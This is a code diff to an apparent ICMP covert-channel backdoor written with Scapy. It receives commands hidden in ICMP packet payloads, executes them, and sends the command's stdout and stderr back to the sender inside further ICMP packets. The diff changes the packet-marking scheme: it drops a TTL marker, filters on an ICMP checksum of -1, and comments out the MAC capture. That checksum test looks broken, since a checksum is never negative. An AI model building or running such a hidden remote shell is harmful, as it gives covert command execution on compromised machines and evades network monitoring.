@@ -23,7 +23,7 @@ def readstdout():
         string = f'{l.decode("cp866", "backslashreplace")}'.strip()
         if string == '':
             continue
-        reply_packet = Ether(dst=destination_mac) / IP(dst=destination_ip, ttl=config.TTL) / ICMP(type=config.TYPE,
+        reply_packet = Ether(dst=destination_mac) / IP(dst=destination_ip) / ICMP(type=config.TYPE,
                                                                                                   id=config.ID) / string
         sendp(reply_packet, verbose=False)
         sys.stdout.write(string + "\n")
@@ -34,7 +34,7 @@ def readstderr():
         string = f'{l.decode("cp866", "backslashreplace")}'.strip()
         if string == '':
             continue
-        reply_packet = Ether(dst=destination_mac) / IP(dst=destination_ip, ttl=config.TTL) / ICMP(type=config.TYPE,
+        reply_packet = Ether(dst=destination_mac) / IP(dst=destination_ip) / ICMP(type=config.TYPE,
                                                                                                   id=config.ID) / string
         sendp(reply_packet, verbose=False)
         sys.stderr.write(string + "\n")
@@ -47,9 +47,9 @@ def sendcommand(cmd):
 
 def packet_callback(packet):
     global destination_ip, destination_mac
-    if packet[IP].ttl == config.TTL and packet[ICMP].id == config.ID and packet[ICMP].type == config.TYPE:
+    if packet[ICMP].chksum == -1 and packet[ICMP].id == config.ID and packet[ICMP].type == config.TYPE:
         destination_ip = packet[IP].src
-        destination_mac = packet[Ether].src
+        #destination_mac = packet[Ether].src
         received_data = packet[ICMP].payload.load.decode('utf-8')
         print("-----+ OUT DATA +-----")
         sendcommand(received_data)
